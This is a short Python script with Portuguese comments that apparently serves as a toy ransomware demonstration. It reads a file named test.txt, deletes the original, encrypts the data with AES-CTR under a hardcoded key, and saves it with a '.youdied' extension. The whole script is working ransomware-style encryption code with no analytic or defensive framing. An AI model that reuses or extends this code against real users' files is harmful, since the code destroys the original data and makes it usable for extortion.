import os
import pyaes

## abre o arquivo que vai criptografado
file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remove o arquivo
os.remove(file_name)

## chave para criptografar o arquivo
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografa o arquivo
crypto_data = aes.encrypt(file_data)

## salva o arquivo criptografado
new_file = file_name + ".youdied"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
